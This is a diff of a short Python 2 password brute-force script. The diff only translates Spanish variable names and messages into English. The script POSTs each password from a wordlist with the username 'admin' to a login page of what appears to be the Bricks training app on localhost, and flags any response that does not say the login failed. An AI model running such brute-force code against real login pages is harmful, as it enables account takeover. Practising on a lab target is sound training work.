@@ -2,26 +2,25 @@ import httplib, urllib
 # -*- encoding: utf-8 -*-
 
 infile = open('passwd.txt', 'r')
-usuario = 'admin'
+user = 'admin'
 host = 'localhost:80'
-ruta = '/bricks/login-1/index.php'
-print "Objetivo : "+host+ruta
+path = '/bricks/login-1/index.php'
+print "Target : "+host+path
 
 for line in infile:
 	password=line.rstrip('\n')
-	parametros = urllib.urlencode({'submit':'submit','username':usuario,'passwd':password})
-	cabeceras = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
-	abrir_conexion = httplib.HTTPConnection(host)
-	abrir_conexion.request("POST", ruta, parametros, cabeceras)
-	respuesta = abrir_conexion.getresponse()
-	print respuesta.status,
-	print "--> "+usuario+":"+password,
-	codigo_fuente = respuesta.read()
-	if codigo_fuente.find("Wrong user name or password") >= 0:
-		print chr(27)+"[0;91m"+"Incorrecto"
+	param = urllib.urlencode({'submit':'submit','username':user,'passwd':password})
+	header = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
+	connect = httplib.HTTPConnection(host)
+	connect.request("POST", path, param, header)
+	response = connect.getresponse()
+	print response.status,
+	print "--> "+user+":"+password,
+	code = response.read()
+	if code.find("Wrong user name or password") >= 0:
+		print chr(27)+"[0;91m"+"Incorrect"
 	else:
-		print chr(27)+"[0;92m"+"Correcto"
+		print chr(27)+"[0;92m"+"Correct"
 	print chr(27)+"[0m"
-	abrir_conexion.close()
+	connect.close()
 infile.close()
-
